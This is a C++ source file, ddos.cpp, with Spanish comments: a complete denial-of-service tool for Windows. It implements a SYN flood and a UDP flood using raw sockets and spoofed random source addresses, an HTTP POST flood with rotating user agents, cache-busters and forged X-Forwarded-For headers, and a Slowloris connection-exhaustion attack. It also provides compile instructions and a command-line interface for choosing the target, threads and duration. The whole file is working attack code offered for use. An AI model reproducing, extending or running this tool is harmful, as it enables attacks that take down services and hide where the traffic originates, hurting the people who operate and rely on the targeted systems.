// language: C++, file: ddos.cpp, target: Windows 10/11 x64, MSVC
// *enlazar: ws2_32.lib*
// *compilar: cl /std:c++20 /O2 /EHsc /W4 ddos.cpp /link ws2_32.lib*
// *raw sockets requieren admin; http/slow no*

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <random>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <cerrno>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")

// ---------- structs antes de cualquier uso ----------

#pragma pack(push, 1)
struct IPHeader {
    uint8_t  ver_ihl;
    uint8_t  tos;
    uint16_t total_len;
    uint16_t id;
    uint16_t frag;
    uint8_t  ttl;
    uint8_t  proto;
    uint16_t checksum;
    uint32_t src;
    uint32_t dst;
};

struct TCPHeader {
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq;
    uint32_t ack;
    uint8_t  data_off;
    uint8_t  flags;
    uint16_t window;
    uint16_t checksum;
    uint16_t urgent;
};

struct UDPHeader {
    uint16_t src_port;
    uint16_t dst_port;
    uint16_t len;
    uint16_t checksum;
};
#pragma pack(pop)

#define TCP_SYN 0x02
#define TCP_ACK 0x10
#define TCP_RST 0x04
#define TCP_PSH 0x08
#define TCP_FIN 0x01

// ---------- checksums ----------

static uint16_t Checksum(const void* data, size_t len) {
    const uint16_t* p = (const uint16_t*)data;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t*)p;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static uint16_t TcpChecksum(const IPHeader* ip, const TCPHeader* tcp,
    const uint8_t* payload, size_t plen)
{
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t  zero;
        uint8_t  proto;
        uint16_t len;
    } pseudo{};
    pseudo.src = ip->src;
    pseudo.dst = ip->dst;
    pseudo.zero = 0;
    pseudo.proto = IPPROTO_TCP;
    pseudo.len = htons((uint16_t)(sizeof(TCPHeader) + plen));

    std::vector<uint8_t> buf(sizeof(pseudo) + sizeof(TCPHeader) + plen);
    memcpy(buf.data(), &pseudo, sizeof(pseudo));
    memcpy(buf.data() + sizeof(pseudo), tcp, sizeof(TCPHeader));
    if (plen) memcpy(buf.data() + sizeof(pseudo) + sizeof(TCPHeader), payload, plen);
    return Checksum(buf.data(), buf.size());
}

// ---------- utilidades ----------

static std::mt19937 g_rng((unsigned)std::chrono::steady_clock::now().time_since_epoch().count());

static uint32_t Rand32() { return g_rng(); }
static uint16_t Rand16() { return (uint16_t)(g_rng() & 0xFFFF); }

static uint32_t RandomSpoofIP() {
    uint32_t ip;
    do {
        ip = Rand32();
    } while (((ip >> 24) == 10) || ((ip >> 24) == 127) ||
        ((ip >> 24) == 0) || ((ip >> 24) >= 224) ||
        (((ip >> 16) & 0xFFFF) == 0xA9FE) ||
        (((ip >> 20) & 0xFFF) == 0xAC1) ||  // 172.16/12
        (((ip >> 16) & 0xFFFF) == 0xC0A8));  // 192.168/16
    return ip;
}

static std::string ResolveHost(const std::string& host) {
    addrinfo hints{}, * res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0 || !res) return {};
    char buf[INET_ADDRSTRLEN]{};
    inet_ntop(AF_INET, &((sockaddr_in*)res->ai_addr)->sin_addr, buf, sizeof(buf));
    std::string ip = buf;
    freeaddrinfo(res);
    return ip;
}

static bool ParseIPv4(const std::string& s, uint32_t& out_net) {
    IN_ADDR a{};
    if (InetPtonA(AF_INET, s.c_str(), &a) != 1) return false;
    out_net = a.S_un.S_addr;
    return true;
}

static bool ResolveToU32(const char* arg, uint32_t& out) {
    std::string ip = ResolveHost(arg);
    if (ip.empty()) ip = arg;
    return ParseIPv4(ip, out);
}

// validación de enteros: strtol con mínimo, error si basura o fuera de rango
static bool ParseInt(const char* s, int& out, int minval = 1, int maxval = INT_MAX) {
    if (!s || !*s) return false;
    char* end = nullptr;
    errno = 0;
    long v = std::strtol(s, &end, 10);
    if (errno != 0 || end == s || *end != '\0' || v < minval || v > maxval) return false;
    out = (int)v;
    return true;
}

// ---------- SYN flood ----------

static std::atomic<uint64_t> g_syn_sent{ 0 };

static void SynFloodWorker(uint32_t target_ip, uint16_t target_port, int duration_sec) {
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s == INVALID_SOCKET) return;

    BOOL opt = TRUE;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&opt, sizeof(opt));
    int sndbuf = 1 << 20;
    setsockopt(s, SOL_SOCKET, SO_SNDBUF, (char*)&sndbuf, sizeof(sndbuf));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = target_ip;

    auto start = std::chrono::steady_clock::now();
    uint8_t pkt[sizeof(IPHeader) + sizeof(TCPHeader)]{};

    while (std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::steady_clock::now() - start).count() < duration_sec)
    {
        IPHeader* ip = (IPHeader*)pkt;
        TCPHeader* tcp = (TCPHeader*)(pkt + sizeof(IPHeader));

        ip->ver_ihl = 0x45;
        ip->tos = 0;
        ip->total_len = htons((uint16_t)sizeof(pkt));
        ip->id = htons(Rand16());
        ip->frag = 0;
        ip->ttl = 64;
        ip->proto = IPPROTO_TCP;
        ip->src = RandomSpoofIP();
        ip->dst = target_ip;
        ip->checksum = 0;
        ip->checksum = Checksum(ip, sizeof(IPHeader));

        tcp->src_port = htons((uint16_t)(Rand16() | 1024));
        tcp->dst_port = htons(target_port);
        tcp->seq = Rand32();
        tcp->ack = 0;
        tcp->data_off = 0x50;
        tcp->flags = TCP_SYN;
        tcp->window = htons(64240);
        tcp->checksum = 0;
        tcp->urgent = 0;
        tcp->checksum = TcpChecksum(ip, tcp, nullptr, 0);

        sendto(s, (char*)pkt, (int)sizeof(pkt), 0, (sockaddr*)&dst, sizeof(dst));
        g_syn_sent.fetch_add(1, std::memory_order_relaxed);
    }
    closesocket(s);
}

// ---------- UDP flood ----------

static std::atomic<uint64_t> g_udp_sent{ 0 };

static void UdpFloodWorker(uint32_t target_ip, uint16_t target_port,
    size_t payload_size, int duration_sec)
{
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s == INVALID_SOCKET) return;
    BOOL opt = TRUE;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&opt, sizeof(opt));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = target_ip;

    size_t total = sizeof(IPHeader) + sizeof(UDPHeader) + payload_size;
    std::vector<uint8_t> pkt(total);

    auto start = std::chrono::steady_clock::now();
    while (std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::steady_clock::now() - start).count() < duration_sec)
    {
        IPHeader* ip = (IPHeader*)pkt.data();
        UDPHeader* udp = (UDPHeader*)(pkt.data() + sizeof(IPHeader));
        uint8_t* pay = pkt.data() + sizeof(IPHeader) + sizeof(UDPHeader);

        for (size_t i = 0; i < payload_size; i++) pay[i] = (uint8_t)Rand32();

        ip->ver_ihl = 0x45;
        ip->tos = 0;
        ip->total_len = htons((uint16_t)total);
        ip->id = htons(Rand16());
        ip->frag = 0;
        ip->ttl = 64;
        ip->proto = IPPROTO_UDP;
        ip->src = RandomSpoofIP();
        ip->dst = target_ip;
        ip->checksum = 0;
        ip->checksum = Checksum(ip, sizeof(IPHeader));

        udp->src_port = htons((uint16_t)(Rand16() | 1024));
        udp->dst_port = htons(target_port);
        udp->len = htons((uint16_t)(sizeof(UDPHeader) + payload_size));
        udp->checksum = 0;

        sendto(s, (char*)pkt.data(), (int)total, 0, (sockaddr*)&dst, sizeof(dst));
        g_udp_sent.fetch_add(1, std::memory_order_relaxed);
    }
    closesocket(s);
}

// ---------- HTTP flood ----------

static std::atomic<uint64_t> g_http_sent{ 0 };
static std::atomic<uint64_t> g_http_ok{ 0 };

static const char* kUserAgents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
};

static std::string RandomCacheBuster() {
    static const char cs[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::string s;
    for (int i = 0; i < 16; i++) s.push_back(cs[g_rng() % (sizeof(cs) - 1)]);
    return s;
}

// connect con timeout real vía non-blocking + select (connect bloqueante en Windows ignora SO_SNDTIMEO)
static bool ConnectTimeout(SOCKET s, const sockaddr_in& dst, int timeout_sec) {
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);

    int rc = connect(s, (const sockaddr*)&dst, sizeof(dst));
    if (rc == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err != WSAEWOULDBLOCK && err != WSAEINPROGRESS) return false;

        fd_set wf; FD_ZERO(&wf); FD_SET(s, &wf);
        timeval tv{ timeout_sec, 0 };
        int sel = select(0, nullptr, &wf, nullptr, &tv);
        if (sel <= 0) return false;

        int so_err = 0, l = sizeof(so_err);
        if (getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&so_err, &l) != 0) return false;
        if (so_err != 0) return false;
    }

    nb = 0;
    ioctlsocket(s, FIONBIO, &nb);
    return true;
}

static bool HttpOneShot(uint32_t target_ip, uint16_t port,
    const std::string& host, const std::string& path)
{
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return false;

    DWORD tv = 3000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&tv, sizeof(tv));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(port);
    dst.sin_addr.s_addr = target_ip;

    if (!ConnectTimeout(s, dst, 3)) {
        closesocket(s);
        return false;
    }

    std::string ua = kUserAgents[g_rng() % (sizeof(kUserAgents) / sizeof(kUserAgents[0]))];
    std::string cb = RandomCacheBuster();
    std::string fullPath = path;
    fullPath += (path.find('?') == std::string::npos) ? "?" : "&";
    fullPath += "cb=" + cb;

    std::string body = "cb=" + cb + "&r=" + RandomCacheBuster();
    std::stringstream req;
    req << "POST " << fullPath << " HTTP/1.1\r\n"
        << "Host: " << host << "\r\n"
        << "User-Agent: " << ua << "\r\n"
        << "Accept: */*\r\n"
        << "Accept-Language: en-US,en;q=0.9\r\n"
        << "Accept-Encoding: gzip, deflate, br\r\n"
        << "Connection: keep-alive\r\n"
        << "Cache-Control: no-cache, no-store, must-revalidate\r\n"
        << "Pragma: no-cache\r\n"
        << "X-Forwarded-For: " << (Rand32() & 0xFFFFFF) << "."
        << (Rand32() & 0xFF) << "."
        << (Rand32() & 0xFF) << "."
        << (Rand32() & 0xFF) << "\r\n"
        << "Content-Type: application/x-www-form-urlencoded\r\n"
        << "Content-Length: " << body.size() << "\r\n"
        << "\r\n"
        << body;

    std::string r = req.str();
    int sent = send(s, r.data(), (int)r.size(), 0);
    if (sent > 0) {
        char buf[512];
        int got = recv(s, buf, sizeof(buf) - 1, 0);
        if (got > 0) {
            buf[got] = 0;                     // null-terminar antes de strstr
            if (strstr(buf, "HTTP/")) {
                g_http_ok.fetch_add(1, std::memory_order_relaxed);
                closesocket(s);
                return true;
            }
        }
    }
    closesocket(s);
    return false;
}

static void HttpFloodWorker(uint32_t target_ip, uint16_t port, const std::string& host,
    const std::string& path, int duration_sec)
{
    auto start = std::chrono::steady_clock::now();
    while (std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::steady_clock::now() - start).count() < duration_sec)
    {
        HttpOneShot(target_ip, port, host, path);
        g_http_sent.fetch_add(1, std::memory_order_relaxed);
    }
}

// ---------- Slowloris ----------

static std::atomic<uint64_t> g_slow_open{ 0 };

static void SlowlorisWorker(uint32_t target_ip, uint16_t port, const std::string& host,
    int conns_per_worker, int hold_sec)
{
    std::vector<SOCKET> socks;
    socks.reserve((size_t)conns_per_worker);

    for (int i = 0; i < conns_per_worker; i++) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) continue;

        sockaddr_in dst{};
        dst.sin_family = AF_INET;
        dst.sin_port = htons(port);
        dst.sin_addr.s_addr = target_ip;

        if (!ConnectTimeout(s, dst, 3)) {
            closesocket(s);
            continue;
        }

        std::stringstream req;
        req << "GET /?" << RandomCacheBuster() << " HTTP/1.1\r\n"
            << "Host: " << host << "\r\n"
            << "User-Agent: " << kUserAgents[g_rng() % (sizeof(kUserAgents) / sizeof(kUserAgents[0]))] << "\r\n"
            << "Accept: */*\r\n";

        std::string r = req.str();
        send(s, r.data(), (int)r.size(), 0);
        socks.push_back(s);
    }

    g_slow_open.fetch_add(socks.size(), std::memory_order_relaxed);

    auto start = std::chrono::steady_clock::now();
    while (std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::steady_clock::now() - start).count() < hold_sec)
    {
        std::this_thread::sleep_for(std::chrono::seconds(10));
        // limpia sockets muertos y mantiene vivos los que responden
        for (auto it = socks.begin(); it != socks.end(); ) {
            std::string hdr = "X-Keep: " + RandomCacheBuster() + "\r\n";
            int rc = send(*it, hdr.data(), (int)hdr.size(), 0);
            if (rc == SOCKET_ERROR || rc == 0) {
                closesocket(*it);
                it = socks.erase(it);
            }
            else {
                ++it;
            }
        }
    }

    for (auto& s : socks) closesocket(s);
}

// ---------- CLI ----------

static void Usage() {
    printf(
        "uso:\n"
        "  ddos syn   <ip|host> <puerto> <hilos> <segundos>\n"
        "  ddos udp   <ip|host> <puerto> <hilos> <segundos> <tam_payload 1..65479>\n"
        "  ddos http  <ip|host> <puerto> <hilos> <segundos> <path>\n"
        "  ddos slow  <ip|host> <puerto> <hilos> <conn_por_hilo> <segundos>\n"
    );
}

static void ProgressLoop(const std::atomic<uint64_t>& counter, const char* label,
    std::atomic<bool>& stop)
{
    uint64_t last = 0;
    while (!stop.load(std::memory_order_relaxed)) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        uint64_t cur = counter.load(std::memory_order_relaxed);
        char line[80];
        snprintf(line, sizeof(line), "[%s] total=%llu pps=%llu", label,
            (unsigned long long)cur,
            (unsigned long long)(cur - last));
        printf("\r%-78s", line);              // pad para limpiar residuos
        fflush(stdout);
        last = cur;
    }
}

int main(int argc, char** argv) {
    if (argc < 2) { Usage(); return 1; }

    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa)) {
        fprintf(stderr, "WSAStartup fallo\n");
        return 1;
    }

    std::string mode = argv[1];
    int rc = 0;

    if (mode == "syn" && argc == 6) {
        uint32_t tip;
        uint16_t port;
        int threads, dur, p;
        if (!ResolveToU32(argv[2], tip)) { fprintf(stderr, "IP invalida\n"); rc = 1; goto done; }
        if (!ParseInt(argv[3], p, 1, 65535)) { fprintf(stderr, "puerto invalido\n"); rc = 1; goto done; }
        port = (uint16_t)p;
        if (!ParseInt(argv[4], threads, 1, 4096)) { fprintf(stderr, "hilos invalido\n"); rc = 1; goto done; }
        if (!ParseInt(argv[5], dur, 1, 86400)) { fprintf(stderr, "duracion invalida\n"); rc = 1; goto done; }

        printf("[syn] %s:%u hilos=%d dur=%ds\n", argv[2], port, threads, dur);
        std::atomic<bool> stop{ false };
        std::thread reporter(ProgressLoop, std::cref(g_syn_sent), "syn", std::ref(stop));

        std::vector<std::thread> v;
        for (int i = 0; i < threads; i++)
            v.emplace_back(SynFloodWorker, tip, port, dur);
        for (auto& t : v) t.join();

        stop.store(true);
        reporter.join();
        printf("\ntotal: %llu\n", (unsigned long long)g_syn_sent.load());
    }
    else if (mode == "udp" && argc == 7) {
        uint32_t tip;
        uint16_t port;
        int threads, dur, p, pl;
        if (!ResolveToU32(argv[2], tip)) { fprintf(stderr, "IP invalida\n"); rc = 1; goto done; }
        if (!ParseInt(argv[3], p, 1, 65535)) { fprintf(stderr, "puerto invalido\n"); rc = 1; goto done; }
        port = (uint16_t)p;
        if (!ParseInt(argv[4], threads, 1, 4096)) { fprintf(stderr, "hilos invalido\n"); rc = 1; goto done; }
        if (!ParseInt(argv[5], dur, 1, 86400)) { fprintf(stderr, "duracion invalida\n"); rc = 1; goto done; }
        if (!ParseInt(argv[6], pl, 1, 65479)) { fprintf(stderr, "payload fuera de rango (1..65479)\n"); rc = 1; goto done; }

        printf("[udp] %s:%u hilos=%d dur=%ds payload=%d\n", argv[2], port, threads, dur, pl);
        std::atomic<bool> stop{ false };
        std::thread reporter(ProgressLoop, std::cref(g_udp_sent), "udp", std::ref(stop));

        std::vector<std::thread> v;
        for (int i = 0; i < threads; i++)
            v.emplace_back(UdpFloodWorker, tip, port, (size_t)pl, dur);
        for (auto& t : v) t.join();

        stop.store(true);
        reporter.join();
        printf("\ntotal: %llu\n", (unsigned long long)g_udp_sent.load());
    }
    else if (mode == "http" && argc == 7) {
        uint32_t tip;
        uint16_t port;
        int threads, dur, p;
        if (!ResolveToU32(argv[2], tip)) { fprintf(stderr, "IP invalida\n"); rc = 1; goto done; }
        if (!ParseInt(argv[3], p, 1, 65535)) { fprintf(stderr, "puerto invalido\n"); rc = 1; goto done; }
        port = (uint16_t)p;
        if (!ParseInt(argv[4], threads, 1, 4096)) { fprintf(stderr, "hilos invalido\n"); rc = 1; goto done; }
        if (!ParseInt(argv[5], dur, 1, 86400)) { fprintf(stderr, "duracion invalida\n"); rc = 1; goto done; }
        std::string path = argv[6];
        std::string host = argv[2];

        printf("[http] %s:%u%s hilos=%d dur=%ds\n", argv[2], port, path.c_str(), threads, dur);
        std::atomic<bool> stop{ false };
        std::thread reporter(ProgressLoop, std::cref(g_http_sent), "http", std::ref(stop));

        std::vector<std::thread> v;
        for (int i = 0; i < threads; i++)
            v.emplace_back(HttpFloodWorker, tip, port, std::cref(host), std::cref(path), dur);
        for (auto& t : v) t.join();

        stop.store(true);
        reporter.join();
        printf("\nenviadas: %llu  ok: %llu\n",
            (unsigned long long)g_http_sent.load(),
            (unsigned long long)g_http_ok.load());
    }
    else if (mode == "slow" && argc == 7) {
        uint32_t tip;
        uint16_t port;
        int threads, conns, dur, p;
        if (!ResolveToU32(argv[2], tip)) { fprintf(stderr, "IP invalida\n"); rc = 1; goto done; }
        if (!ParseInt(argv[3], p, 1, 65535)) { fprintf(stderr, "puerto invalido\n"); rc = 1; goto done; }
        port = (uint16_t)p;
        if (!ParseInt(argv[4], threads, 1, 4096)) { fprintf(stderr, "hilos invalido\n"); rc = 1; goto done; }
        if (!ParseInt(argv[5], conns, 1, 10000)) { fprintf(stderr, "conns invalido\n"); rc = 1; goto done; }
        if (!ParseInt(argv[6], dur, 1, 86400)) { fprintf(stderr, "duracion invalida\n"); rc = 1; goto done; }
        std::string host = argv[2];

        printf("[slow] %s:%u hilos=%d conns=%d dur=%ds\n", argv[2], port, threads, conns, dur);
        std::vector<std::thread> v;
        for (int i = 0; i < threads; i++)
            v.emplace_back(SlowlorisWorker, tip, port, std::cref(host), conns, dur);
        for (auto& t : v) t.join();
        printf("conexiones mantenidas pico: %llu\n", (unsigned long long)g_slow_open.load());
    }
    else {
        Usage();
        rc = 1;
    }

done:
    WSACleanup();
    return rc;
}